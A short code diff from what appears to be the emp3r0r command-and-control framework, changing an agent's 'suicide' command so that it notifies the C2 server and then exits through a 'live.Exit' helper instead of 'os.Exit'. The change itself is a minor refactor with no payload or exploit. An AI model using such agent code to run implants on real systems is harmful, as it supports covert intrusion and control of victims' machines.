@@ -1,11 +1,10 @@
 package handler
 
 import (
-	"os"
-
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/spf13/cobra"
 )
 
@@ -17,5 +16,5 @@ func suicideCmdRun(cmd *cobra.Command, args []string) {
 	}
 	c2transport.NotifyC2(cmd, "Exiting")
 	logging.Infof("Exiting...")
-	os.Exit(0)
+	live.Exit(0)
 }
